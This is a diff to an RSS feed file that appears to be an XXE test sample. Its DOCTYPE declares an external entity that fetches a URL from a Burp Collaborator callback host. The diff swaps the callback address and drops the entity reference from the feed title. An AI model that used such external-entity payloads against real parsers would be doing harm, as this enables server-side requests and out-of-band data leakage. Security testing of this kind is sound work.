@@ -1,11 +1,11 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
-<!ENTITY sp SYSTEM "https://xxe.y76nbk5h5nmi1ibycbth5u49t0zqnf.burpcollaborator.net:443/xxe.txt">
+<!ENTITY sp SYSTEM "https://xxe.qpj9rzij4ipz9h3886tx5z9es5y4mt.burpcollaborator.net/xxe.txt">
 ]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
-    <title><r>&sp;</r>The Blog</title>
+    <title>The Blog</title>
     <link>http://example.com/</link>
     <description>A blog about things</description>
     <lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
